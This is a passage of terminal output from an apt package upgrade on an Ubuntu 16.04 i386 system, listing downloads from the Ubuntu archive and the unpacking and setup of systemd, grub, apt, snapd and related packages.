Get:62 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ubuntu-release-upgrader-core all 1:16.04.29 [30.3 kB]
Get:63 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 update-manager all 1:16.04.17 [543 kB] 
Get:64 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 update-manager-core all 1:16.04.17 [5,488 B]
Get:65 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-distupgrade all 1:16.04.29 [104 kB]
Get:66 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-update-manager all 1:16.04.17 [33.5 kB]
Get:67 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 aptdaemon all 1.1.1+bzr982-0ubuntu14.1 [13.5 kB]
Get:68 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-aptdaemon.pkcompat all 1.1.1+bzr982-0ubuntu14.1 [23.1 kB]
Get:69 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-aptdaemon.gtk3widgets all 1.1.1+bzr982-0ubuntu14.1 [13.9 kB]
Get:70 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-aptdaemon all 1.1.1+bzr982-0ubuntu14.1 [77.1 kB]
Get:71 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 aptdaemon-data all 1.1.1+bzr982-0ubuntu14.1 [160 kB]
Get:72 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ubuntu-standard i386 1.361.4 [2,826 B] 
Get:73 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 dpkg-dev all 1.18.4ubuntu1.6 [584 kB]  
Get:74 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libdpkg-perl all 1.18.4ubuntu1.6 [195 kB]
Get:75 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libdfu1 i386 0.8.3-0ubuntu5 [51.6 kB]  
Get:76 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libfwupd1 i386 0.8.3-0ubuntu5 [33.7 kB]
Get:77 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 fwupd i386 0.8.3-0ubuntu5 [131 kB]     
Get:78 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 ubuntu-software i386 3.20.5-0ubuntu0.16.04.12 [11.6 kB]
Get:79 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 gnome-software i386 3.20.5-0ubuntu0.16.04.12 [274 kB]
Get:80 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 gnome-software-common all 3.20.5-0ubuntu0.16.04.12 [2,521 kB]
Get:81 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libsnapd-glib1 i386 1.49-0ubuntu0.16.04.0 [91.3 kB]
Get:82 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libsnmp-base all 5.7.3+dfsg-1ubuntu4.4 [224 kB]
Get:83 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libsnmp30 i386 5.7.3+dfsg-1ubuntu4.4 [828 kB]
Get:84 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 unity i386 7.4.5+16.04.20190312-0ubuntu1 [1,650 kB]
Get:85 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 libunity-core-6.0-9 i386 7.4.5+16.04.20190312-0ubuntu1 [458 kB]
Get:86 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 unity-schemas all 7.4.5+16.04.20190312-0ubuntu1 [13.0 kB]
Get:87 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 unity-services i386 7.4.5+16.04.20190312-0ubuntu1 [35.4 kB]
Get:88 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 linux-libc-dev i386 4.4.0-170.199 [840 kB]
Get:89 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 software-properties-common all 0.96.20.9 [9,452 B]
Get:90 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 software-properties-gtk all 0.96.20.9 [47.2 kB]
Get:91 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 python3-software-properties all 0.96.20.9 [20.1 kB]
Get:92 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 unattended-upgrades all 1.1ubuntu1.18.04.7~16.04.4 [41.9 kB]
Get:93 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 usb-creator-gtk i386 0.3.2ubuntu16.04.2 [21.3 kB]
Get:94 http://us.archive.ubuntu.com/ubuntu xenial-updates/main i386 usb-creator-common i386 0.3.2ubuntu16.04.2 [13.9 kB]
Fetched 41.9 MB in 15s (2,648 kB/s)                                                                        
Extracting templates from packages: 100%
Preconfiguring packages ...
(Reading database ... 218292 files and directories currently installed.)
Preparing to unpack .../base-files_9.4ubuntu4.11_i386.deb ...
Unpacking base-files (9.4ubuntu4.11) over (9.4ubuntu4.8) ...
Processing triggers for plymouth-theme-ubuntu-text (0.9.2-3ubuntu13.5) ...
update-initramfs: deferring update (trigger activated)
Processing triggers for cracklib-runtime (2.9.2-1ubuntu1) ...
Processing triggers for man-db (2.7.5-1) ...
Processing triggers for install-info (6.1.0.dfsg.1-5) ...
Processing triggers for initramfs-tools (0.122ubuntu8.14) ...
update-initramfs: Generating /boot/initrd.img-4.15.0-70-generic
Setting up base-files (9.4ubuntu4.11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../bsdutils_1%3a2.27.1-6ubuntu3.9_i386.deb ...
Unpacking bsdutils (1:2.27.1-6ubuntu3.9) over (1:2.27.1-6ubuntu3.6) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up bsdutils (1:2.27.1-6ubuntu3.9) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../dpkg_1.18.4ubuntu1.6_i386.deb ...
Unpacking dpkg (1.18.4ubuntu1.6) over (1.18.4ubuntu1.5) ...
Setting up dpkg (1.18.4ubuntu1.6) ...
Processing triggers for man-db (2.7.5-1) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../login_1%3a4.2-3.1ubuntu5.4_i386.deb ...
Unpacking login (1:4.2-3.1ubuntu5.4) over (1:4.2-3.1ubuntu5.3) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up login (1:4.2-3.1ubuntu5.4) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../util-linux_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking util-linux (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for ureadahead (0.100.0-19) ...
Processing triggers for mime-support (3.59ubuntu1) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up util-linux (2.27.1-6ubuntu3.9) ...
Installing new version of config file /etc/cron.weekly/fstrim ...
Processing triggers for systemd (229-4ubuntu21.21) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../mount_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking mount (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up mount (2.27.1-6ubuntu3.9) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5.4_i386.deb ...
Unpacking passwd (1:4.2-3.1ubuntu5.4) over (1:4.2-3.1ubuntu5.3) ...
Processing triggers for man-db (2.7.5-1) ...
Processing triggers for ureadahead (0.100.0-19) ...
Setting up passwd (1:4.2-3.1ubuntu5.4) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libuuid1_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking libuuid1:i386 (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libuuid1:i386 (2.27.1-6ubuntu3.9) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libblkid1_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking libblkid1:i386 (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libblkid1:i386 (2.27.1-6ubuntu3.9) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libsystemd0_229-4ubuntu21.22_i386.deb ...
Unpacking libsystemd0:i386 (229-4ubuntu21.22) over (229-4ubuntu21.21) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libsystemd0:i386 (229-4ubuntu21.22) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libpam-systemd_229-4ubuntu21.22_i386.deb ...
Unpacking libpam-systemd:i386 (229-4ubuntu21.22) over (229-4ubuntu21.21) ...
Preparing to unpack .../systemd_229-4ubuntu21.22_i386.deb ...
Unpacking systemd (229-4ubuntu21.22) over (229-4ubuntu21.21) ...
Processing triggers for man-db (2.7.5-1) ...
Processing triggers for dbus (1.10.6-1ubuntu3.4) ...
Processing triggers for ureadahead (0.100.0-19) ...
Setting up systemd (229-4ubuntu21.22) ...
addgroup: The group `systemd-journal' already exists as a system group. Exiting.
[/usr/lib/tmpfiles.d/var.conf:14] Duplicate line for path "/var/log", ignoring.
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../udev_229-4ubuntu21.22_i386.deb ...
Unpacking udev (229-4ubuntu21.22) over (229-4ubuntu21.21) ...
Preparing to unpack .../libudev1_229-4ubuntu21.22_i386.deb ...
Unpacking libudev1:i386 (229-4ubuntu21.22) over (229-4ubuntu21.21) ...
Processing triggers for man-db (2.7.5-1) ...
Processing triggers for ureadahead (0.100.0-19) ...
Processing triggers for systemd (229-4ubuntu21.22) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libudev1:i386 (229-4ubuntu21.22) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../grub-pc_2.02~beta2-36ubuntu3.23_i386.deb ...
Unpacking grub-pc (2.02~beta2-36ubuntu3.23) over (2.02~beta2-36ubuntu3.20) ...
Preparing to unpack .../grub-pc-bin_2.02~beta2-36ubuntu3.23_i386.deb ...
Unpacking grub-pc-bin (2.02~beta2-36ubuntu3.23) over (2.02~beta2-36ubuntu3.20) ...
Preparing to unpack .../grub2-common_2.02~beta2-36ubuntu3.23_i386.deb ...
Unpacking grub2-common (2.02~beta2-36ubuntu3.23) over (2.02~beta2-36ubuntu3.20) ...
Preparing to unpack .../grub-common_2.02~beta2-36ubuntu3.23_i386.deb ...
Unpacking grub-common (2.02~beta2-36ubuntu3.23) over (2.02~beta2-36ubuntu3.20) ...
Preparing to unpack .../friendly-recovery_0.2.31ubuntu2.1_all.deb ...
Unpacking friendly-recovery (0.2.31ubuntu2.1) over (0.2.31ubuntu2) ...
Preparing to unpack .../initramfs-tools_0.122ubuntu8.16_all.deb ...
Unpacking initramfs-tools (0.122ubuntu8.16) over (0.122ubuntu8.14) ...
Preparing to unpack .../initramfs-tools-core_0.122ubuntu8.16_all.deb ...
Unpacking initramfs-tools-core (0.122ubuntu8.16) over (0.122ubuntu8.14) ...
Preparing to unpack .../initramfs-tools-bin_0.122ubuntu8.16_i386.deb ...
Unpacking initramfs-tools-bin (0.122ubuntu8.16) over (0.122ubuntu8.14) ...
Preparing to unpack .../debconf-i18n_1.5.58ubuntu2_all.deb ...
Unpacking debconf-i18n (1.5.58ubuntu2) over (1.5.58ubuntu1) ...
Preparing to unpack .../debconf_1.5.58ubuntu2_all.deb ...
Unpacking debconf (1.5.58ubuntu2) over (1.5.58ubuntu1) ...
Processing triggers for install-info (6.1.0.dfsg.1-5) ...
Processing triggers for systemd (229-4ubuntu21.22) ...
Processing triggers for ureadahead (0.100.0-19) ...
Processing triggers for doc-base (0.10.7) ...
Processing 1 changed doc-base file...
Setting up debconf (1.5.58ubuntu2) ...
Processing triggers for man-db (2.7.5-1) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../systemd-sysv_229-4ubuntu21.22_i386.deb ...
Unpacking systemd-sysv (229-4ubuntu21.22) over (229-4ubuntu21.21) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up systemd-sysv (229-4ubuntu21.22) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libmount1_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking libmount1:i386 (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libmount1:i386 (2.27.1-6ubuntu3.9) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libapt-pkg5.0_1.2.32_i386.deb ...
Unpacking libapt-pkg5.0:i386 (1.2.32) over (1.2.29ubuntu0.1) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libapt-pkg5.0:i386 (1.2.32) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218296 files and directories currently installed.)
Preparing to unpack .../libapt-inst2.0_1.2.32_i386.deb ...
Unpacking libapt-inst2.0:i386 (1.2.32) over (1.2.29ubuntu0.1) ...
Preparing to unpack .../archives/apt_1.2.32_i386.deb ...
Unpacking apt (1.2.32) over (1.2.29ubuntu0.1) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up apt (1.2.32) ...
Installing new version of config file /etc/apt/apt.conf.d/01autoremove ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218305 files and directories currently installed.)
Preparing to unpack .../apt-utils_1.2.32_i386.deb ...
Unpacking apt-utils (1.2.32) over (1.2.29ubuntu0.1) ...
Preparing to unpack .../uuid-runtime_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking uuid-runtime (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Preparing to unpack .../ubuntu-core-launcher_2.40_i386.deb ...
Unpacking ubuntu-core-launcher (2.40) over (2.37.4ubuntu0.1) ...
Preparing to unpack .../archives/snapd_2.40_i386.deb ...
Unpacking snapd (2.40) over (2.37.4ubuntu0.1) ...
Preparing to unpack .../libfdisk1_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking libfdisk1:i386 (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for man-db (2.7.5-1) ...
Processing triggers for systemd (229-4ubuntu21.22) ...
Processing triggers for ureadahead (0.100.0-19) ...
Processing triggers for gnome-menus (3.13.3-6ubuntu3.1) ...
Processing triggers for desktop-file-utils (0.22-1ubuntu5.2) ...
Processing triggers for bamfdaemon (0.5.3~bzr0+16.04.20180209-0ubuntu1) ...
Rebuilding /usr/share/applications/bamf-2.index...
Processing triggers for mime-support (3.59ubuntu1) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libfdisk1:i386 (2.27.1-6ubuntu3.9) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218305 files and directories currently installed.)
Preparing to unpack .../libsmartcols1_2.27.1-6ubuntu3.9_i386.deb ...
Unpacking libsmartcols1:i386 (2.27.1-6ubuntu3.9) over (2.27.1-6ubuntu3.6) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libsmartcols1:i386 (2.27.1-6ubuntu3.9) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218305 files and directories currently installed.)
Preparing to unpack .../libsqlite3-0_3.11.0-1ubuntu1.3_i386.deb ...
Unpacking libsqlite3-0:i386 (3.11.0-1ubuntu1.3) over (3.11.0-1ubuntu1.2) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Setting up libsqlite3-0:i386 (3.11.0-1ubuntu1.3) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
(Reading database ... 218305 files and directories currently installed.)
Preparing to unpack .../console-setup-linux_1.108ubuntu15.5_all.deb ...
Unpacking console-setup-linux (1.108ubuntu15.5) over (1.108ubuntu15.4) ...
Preparing to unpack .../console-setup_1.108ubuntu15.5_all.deb ...
Obsolete conffile /etc/init.d/keyboard-setup has been modified by you, renaming to .dpkg-bak
Unpacking console-setup (1.108ubuntu15.5) over (1.108ubuntu15.4) ...
Preparing to unpack .../keyboard-configuration_1.108ubuntu15.5_all.deb ...
Unpacking keyboard-configuration (1.108ubuntu15.5) over (1.108ubuntu15.4) ...
Preparing to unpack .../iproute2_4.3.0-1ubuntu3.16.04.5_i386.deb ...
Unpacking iproute2 (4.3.0-1ubuntu3.16.04.5) over (4.3.0-1ubuntu3.16.04.4) ...
Preparing to unpack .../libisc-export160_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libisc-export160 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libdns-export162_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libdns-export162 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../resolvconf_1.78ubuntu7_all.deb ...
Unpacking resolvconf (1.78ubuntu7) over (1.78ubuntu6) ...
Preparing to unpack .../rsyslog_8.16.0-1ubuntu3.1_i386.deb ...
Unpacking rsyslog (8.16.0-1ubuntu3.1) over (8.16.0-1ubuntu3) ...
Preparing to unpack .../ureadahead_0.100.0-19.1_i386.deb ...
Unpacking ureadahead (0.100.0-19.1) over (0.100.0-19) ...
Preparing to unpack .../ubuntu-minimal_1.361.4_i386.deb ...
Unpacking ubuntu-minimal (1.361.4) over (1.361.2) ...
Preparing to unpack .../apt-transport-https_1.2.32_i386.deb ...
Unpacking apt-transport-https (1.2.32) over (1.2.29ubuntu0.1) ...
Preparing to unpack .../dnsutils_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking dnsutils (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../bind9-host_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking bind9-host (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libisc160_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libisc160:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libdns162_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libdns162:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libisccc140_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libisccc140:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libisccfg140_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libisccfg140:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../liblwres141_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking liblwres141:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libbind9-140_1%3a9.10.3.dfsg.P4-8ubuntu1.15_i386.deb ...
Unpacking libbind9-140:i386 (1:9.10.3.dfsg.P4-8ubuntu1.15) over (1:9.10.3.dfsg.P4-8ubuntu1.14) ...
Preparing to unpack .../libldap-2.4-2_2.4.42+dfsg-2ubuntu3.7_i386.deb ...
Unpacking libldap-2.4-2:i386 (2.4.42+dfsg-2ubuntu3.7) over (2.4.42+dfsg-2ubuntu3.6) ...
Preparing to unpack .../lshw_02.17-1.1ubuntu3.6_i386.deb ...
Unpacking lshw (02.17-1.1ubuntu3.6) over (02.17-1.1ubuntu3.5) ...
Preparing to unpack .../psmisc_22.21-2.1ubuntu0.1_i386.deb ...
Unpacking psmisc (22.21-2.1ubuntu0.1) over (22.21-2.1build1) ...
Preparing to unpack .../python-apt-common_1.1.0~beta1ubuntu0.16.04.5_all.deb ...
Unpacking python-apt-common (1.1.0~beta1ubuntu0.16.04.5) over (1.1.0~beta1ubuntu0.16.04.2) ...
Preparing to unpack .../python3-apt_1.1.0~beta1ubuntu0.16.04.5_i386.deb ...
Unpacking python3-apt (1.1.0~beta1ubuntu0.16.04.5) over (1.1.0~beta1ubuntu0.16.04.2) ...
Preparing to unpack .../ubuntu-release-upgrader-gtk_1%3a16.04.29_all.deb ...
Unpacking ubuntu-release-upgrader-gtk (1:16.04.29) over (1:16.04.26) ...
Preparing to unpack .../ubuntu-release-upgrader-core_1%3a16.04.29_all.deb ...
Unpacking ubuntu-release-upgrader-core (1:16.04.29) over (1:16.04.26) ...
Preparing to unpack .../update-manager_1%3a16.04.17_all.deb ...
Unpacking update-manager (1:16.04.17) over (1:16.04.15) ...
Preparing to unpack .../update-manager-core_1%3a16.04.17_all.deb ...
Unpacking update-manager-core (1:16.04.17) over (1:16.04.15) ...
Preparing to unpack .../python3-distupgrade_1%3a16.04.29_all.deb ...
Unpacking python3-distupgrade (1:16.04.29) over (1:16.04.26) ...
Preparing to unpack .../python3-update-manager_1%3a16.04.17_all.deb ...
Unpacking python3-update-manager (1:16.04.17) over (1:16.04.15) ...
Preparing to unpack .../aptdaemon_1.1.1+bzr982-0ubuntu14.1_all.deb ...
Unpacking aptdaemon (1.1.1+bzr982-0ubuntu14.1) over (1.1.1+bzr982-0ubuntu14) ...
Preparing to unpack .../python3-aptdaemon.pkcompat_1.1.1+bzr982-0ubuntu14.1_all.deb ...
Unpacking python3-aptdaemon.pkcompat (1.1.1+bzr982-0ubuntu14.1) over (1.1.1+bzr982-0ubuntu14) ...
Preparing to unpack .../python3-aptdaemon.gtk3widgets_1.1.1+bzr982-0ubuntu14.1_all.deb ...
Unpacking python3-aptdaemon.gtk3widgets (1.1.1+bzr982-0ubuntu14.1) over (1.1.1+bzr982-0ubuntu14) ...
Preparing to unpack .../python3-aptdaemon_1.1.1+bzr982-0ubuntu14.1_all.deb ...
Unpacking python3-aptdaemon (1.1.1+bzr982-0ubuntu14.1) over (1.1.1+bzr982-0ubuntu14) ...
Preparing to unpack .../aptdaemon-data_1.1.1+bzr982-0ubuntu14.1_all.deb ...
Unpacking aptdaemon-data (1.1.1+bzr982-0ubuntu14.1) over (1.1.1+bzr982-0ubuntu14) ...
Preparing to unpack .../ubuntu-standard_1.361.4_i386.deb ...
Unpacking ubuntu-standard (1.361.4) over (1.361.2) ...
Preparing to unpack .../dpkg-dev_1.18.4ubuntu1.6_all.deb ...
Unpacking dpkg-dev (1.18.4ubuntu1.6) over (1.18.4ubuntu1.5) ...
Preparing to unpack .../libdpkg-perl_1.18.4ubuntu1.6_all.deb ...
Unpacking libdpkg-perl (1.18.4ubuntu1.6) over (1.18.4ubuntu1.5) ...
Preparing to unpack .../libdfu1_0.8.3-0ubuntu5_i386.deb ...
Unpacking libdfu1:i386 (0.8.3-0ubuntu5) over (0.8.3-0ubuntu4) ...
Preparing to unpack .../libfwupd1_0.8.3-0ubuntu5_i386.deb ...
Unpacking libfwupd1:i386 (0.8.3-0ubuntu5) over (0.8.3-0ubuntu4) ...
Preparing to unpack .../fwupd_0.8.3-0ubuntu5_i386.deb ...
Unpacking fwupd (0.8.3-0ubuntu5) over (0.8.3-0ubuntu4) ...
Preparing to unpack .../ubuntu-software_3.20.5-0ubuntu0.16.04.12_i386.deb ...
Unpacking ubuntu-software (3.20.5-0ubuntu0.16.04.12) over (3.20.5-0ubuntu0.16.04.11) ...
Preparing to unpack .../gnome-software_3.20.5-0ubuntu0.16.04.12_i386.deb ...
Unpacking gnome-software (3.20.5-0ubuntu0.16.04.12) over (3.20.5-0ubuntu0.16.04.11) ...
Preparing to unpack .../gnome-software-common_3.20.5-0ubuntu0.16.04.12_all.deb ...
Unpacking gnome-software-common (3.20.5-0ubuntu0.16.04.12) over (3.20.5-0ubuntu0.16.04.11) ...
Preparing to unpack .../libsnapd-glib1_1.49-0ubuntu0.16.04.0_i386.deb ...
Unpacking libsnapd-glib1:i386 (1.49-0ubuntu0.16.04.0) over (1.33-0ubuntu0.16.04.1) ...
Preparing to unpack .../libsnmp-base_5.7.3+dfsg-1ubuntu4.4_all.deb ...
Unpacking libsnmp-base (5.7.3+dfsg-1ubuntu4.4) over (5.7.3+dfsg-1ubuntu4.2) ...
Preparing to unpack .../libsnmp30_5.7.3+dfsg-1ubuntu4.4_i386.deb ...
Unpacking libsnmp30:i386 (5.7.3+dfsg-1ubuntu4.4) over (5.7.3+dfsg-1ubuntu4.2) ...
Preparing to unpack .../unity_7.4.5+16.04.20190312-0ubuntu1_i386.deb ...
Unpacking unity (7.4.5+16.04.20190312-0ubuntu1) over (7.4.5+16.04.20180221-0ubuntu1) ...
Preparing to unpack .../libunity-core-6.0-9_7.4.5+16.04.20190312-0ubuntu1_i386.deb ...
Unpacking libunity-core-6.0-9:i386 (7.4.5+16.04.20190312-0ubuntu1) over (7.4.5+16.04.20180221-0ubuntu1) ...
Preparing to unpack .../unity-schemas_7.4.5+16.04.20190312-0ubuntu1_all.deb ...
Unpacking unity-schemas (7.4.5+16.04.20190312-0ubuntu1) over (7.4.5+16.04.20180221-0ubuntu1) ...
Preparing to unpack .../unity-services_7.4.5+16.04.20190312-0ubuntu1_i386.deb ...
Unpacking unity-services (7.4.5+16.04.20190312-0ubuntu1) over (7.4.5+16.04.20180221-0ubuntu1) ...
Preparing to unpack .../linux-libc-dev_4.4.0-170.199_i386.deb ...
Unpacking linux-libc-dev:i386 (4.4.0-170.199) over (4.4.0-169.198) ...
Preparing to unpack .../software-properties-common_0.96.20.9_all.deb ...
Unpacking software-properties-common (0.96.20.9) over (0.96.20.8) ...
Preparing to unpack .../software-properties-gtk_0.96.20.9_all.deb ...
Unpacking software-properties-gtk (0.96.20.9) over (0.96.20.8) ...
Preparing to unpack .../python3-software-properties_0.96.20.9_all.deb ...
Unpacking python3-software-properties (0.96.20.9) over (0.96.20.8) ...
Preparing to unpack .../unattended-upgrades_1.1ubuntu1.18.04.7~16.04.4_all.deb ...
Unpacking unattended-upgrades (1.1ubuntu1.18.04.7~16.04.4) over (0.90ubuntu0.10) ...
Preparing to unpack .../usb-creator-gtk_0.3.2ubuntu16.04.2_i386.deb ...
Unpacking usb-creator-gtk (0.3.2ubuntu16.04.2) over (0.3.2ubuntu16.04.1) ...
Preparing to unpack .../usb-creator-common_0.3.2ubuntu16.04.2_i386.deb ...
Unpacking usb-creator-common (0.3.2ubuntu16.04.2) over (0.3.2ubuntu16.04.1) ...
Processing triggers for man-db (2.7.5-1) ...
Processing triggers for systemd (229-4ubuntu21.22) ...
Processing triggers for libc-bin (2.23-0ubuntu11) ...
Processing triggers for gnome-menus (3.13.3-6ubuntu3.1) ...
Processing triggers for desktop-file-utils (0.22-1ubuntu5.2) ...
Processing triggers for bamfdaemon (0.5.3~bzr0+16.04.20180209-0ubuntu1) ...
Rebuilding /usr/share/applications/bamf-2.index...
Processing triggers for mime-support (3.59ubuntu1) ...
Processing triggers for libglib2.0-0:i386 (2.48.2-0ubuntu4.4) ...
Processing triggers for dbus (1.10.6-1ubuntu3.4) ...
Processing triggers for hicolor-icon-theme (0.15-0ubuntu1.1) ...
Processing triggers for shared-mime-info (1.5-2ubuntu0.2) ...
Setting up libpam-systemd:i386 (229-4ubuntu21.22) ...
Setting up udev (229-4ubuntu21.22) ...
addgroup: The group `input' already exists as a system group. Exiting.
update-initramfs: deferring update (trigger activated)
Setting up grub-common (2.02~beta2-36ubuntu3.23) ...
update-rc.d: warning: start and stop actions are no longer supported; falling back to defaults
Setting up grub2-common (2.02~beta2-36ubuntu3.23) ...
Setting up grub-pc-bin (2.02~beta2-36ubuntu3.23) ...
Setting up grub-pc (2.02~beta2-36ubuntu3.23) ...
Generating grub configuration file ...
Warning: Setting GRUB_TIMEOUT to a non-zero value when GRUB_HIDDEN_TIMEOUT is set is no longer supported.
Found linux image: /boot/vmlinuz-4.15.0-70-generic
Found initrd image: /boot/initrd.img-4.15.0-70-generic
Found linux image: /boot/vmlinuz-4.15.0-45-generic
Found initrd image: /boot/initrd.img-4.15.0-45-generic
Found memtest86+ image: /boot/memtest86+.elf
Found memtest86+ image: /boot/memtest86+.bin
done
Setting up friendly-recovery (0.2.31ubuntu2.1) ...
Generating grub configuration file ...
Warning: Setting GRUB_TIMEOUT to a non-zero value when GRUB_HIDDEN_TIMEOUT is set is no longer supported.
Found linux image: /boot/vmlinuz-4.15.0-70-generic
Found initrd image: /boot/initrd.img-4.15.0-70-generic
Found linux image: /boot/vmlinuz-4.15.0-45-generic
Found initrd image: /boot/initrd.img-4.15.0-45-generic
Found memtest86+ image: /boot/memtest86+.elf
Found memtest86+ image: /boot/memtest86+.bin
done
Setting up initramfs-tools-bin (0.122ubuntu8.16) ...
Setting up initramfs-tools-core (0.122ubuntu8.16) ...
Setting up initramfs-tools (0.122ubuntu8.16) ...
update-initramfs: deferring update (trigger activated)
Setting up debconf-i18n (1.5.58ubuntu2) ...
Setting up libapt-inst2.0:i386 (1.2.32) ...
Setting up apt-utils (1.2.32) ...
Setting up uuid-runtime (2.27.1-6ubuntu3.9) ...
